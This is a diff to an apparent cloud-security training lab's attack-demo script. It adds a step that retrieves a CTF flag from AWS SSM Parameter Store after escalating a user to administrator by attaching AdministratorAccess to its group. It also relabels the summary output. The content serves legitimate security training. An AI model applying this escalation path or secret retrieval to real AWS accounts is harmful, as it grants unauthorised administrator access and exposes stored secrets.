@@ -190,17 +190,34 @@ IAM_USERS=$(aws iam list-users --query 'Users[*].UserName' --output text | head 
 echo "Successfully listed IAM users: $IAM_USERS"
 echo -e "${GREEN}✓ Confirmed administrator access!${NC}\n"
 
+# [EXPLOIT] Step 8: Capture the CTF flag
+echo -e "${YELLOW}Step 8: Capturing the CTF flag${NC}"
+use_starting_creds
+show_attack_cmd "Attacker" "aws ssm get-parameter --name /pathfinding-labs/flags/iam-010-to-admin --query 'Parameter.Value' --output text"
+FLAG_VALUE=$(aws ssm get-parameter --name /pathfinding-labs/flags/iam-010-to-admin --query 'Parameter.Value' --output text)
+
+if [ -z "$FLAG_VALUE" ]; then
+    echo -e "${RED}Error: Could not retrieve CTF flag — ensure privilege escalation completed successfully${NC}"
+    exit 1
+fi
+
+echo -e "${GREEN}Flag: $FLAG_VALUE${NC}\n"
+
+# Restore helpful permissions for manual exploration
+restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
+
 # Summary
 echo -e "${GREEN}========================================${NC}"
-echo -e "${GREEN}Attack Summary${NC}"
+echo -e "${GREEN}CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "Starting Point: User ${YELLOW}$STARTING_USER${NC}"
 echo -e "Step 1: User is member of group ${YELLOW}$GROUP_NAME${NC}"
 echo -e "Step 2: Attached ${YELLOW}AdministratorAccess${NC} to the group"
 echo -e "Step 3: Gained ${GREEN}Administrator Access${NC} via group membership"
+echo -e "Step 4: Captured CTF flag: ${GREEN}$FLAG_VALUE${NC}"
 echo ""
 echo -e "${YELLOW}Attack Path:${NC}"
-echo -e "  $STARTING_USER → (iam:AttachGroupPolicy) → $GROUP_NAME → AdministratorAccess → Admin"
+echo -e "  $STARTING_USER → (iam:AttachGroupPolicy) → $GROUP_NAME → AdministratorAccess → Admin → (ssm:GetParameter) → CTF Flag"
 echo ""
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
@@ -218,9 +235,6 @@ echo ""
 echo -e "${YELLOW}To clean up:${NC}"
 echo "  ./cleanup_attack.sh or use the plabs TUI/CLI"
 echo ""
-
-# Restore helpful permissions for manual exploration
-restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
 # Mark demo as active for plabs tracking
 touch "$(dirname "$0")/.demo_active"
